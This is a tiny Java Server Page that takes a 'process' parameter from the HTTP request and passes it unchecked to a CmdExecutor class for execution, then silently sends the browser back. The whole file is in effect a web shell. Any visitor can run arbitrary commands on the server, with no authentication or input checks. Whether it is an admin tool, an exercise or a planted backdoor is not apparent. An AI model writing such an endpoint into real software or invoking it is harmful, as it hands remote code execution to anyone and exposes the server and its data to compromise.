<%@ page language="java" contentType="text/html; charset=EUC-KR"
    pageEncoding="EUC-KR"%>
<%@ page import="application.CmdExecutor"%> 

<%
		String process=request.getParameter("process");
	CmdExecutor cmd=new CmdExecutor();
	cmd.execute(process);


%>


<script>

window.history.back();

</script>